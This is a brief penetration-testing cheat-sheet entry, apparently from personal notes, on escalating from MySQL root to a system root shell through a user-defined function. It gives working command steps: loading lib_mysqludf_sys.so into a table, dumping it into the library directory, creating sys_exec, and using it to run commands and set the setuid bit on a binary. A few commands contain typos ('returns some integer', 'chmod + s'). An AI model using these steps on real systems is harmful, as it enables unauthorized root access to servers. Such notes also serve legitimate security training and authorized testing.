# SQL

### MySQL running as root

If root access on MySQL then create a user defined function to escalate to root shell https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/ https://www.exploit-db.com/exploits/1518/

Steps: copy 1518.so over or lib\_mysqludf\_sys.so over to target (located on kali under sqlmap directory) /usr/share/sqlmap/udf/mysql/linux/32/lib\_mysqludf\_sys.so\_ /usr/share/sqlmap/udf/mysql/linux/64/lib\_mysqludf\_sys.so\_

```
mysql -u root
use mysql;
create table hack(line blob);
insert into hack values(load_file('/tmp/lib_mysqludf_sys.so'));
select * from hack into dumpfile '/usr/lib/lib_mysqludf_sys.so';
create function sys_exec returns some integer soname'lib_mysqludf_sys.so';
```

Test function:

```
select sys_exec('id >/tmp/out; chown user:user /tmp/out');
quit
cat /tmp/out
```

Use function to run a setuid program:

```
select sys_exec('chmod + s /tmp/setuid');
/tmp/setuid
```
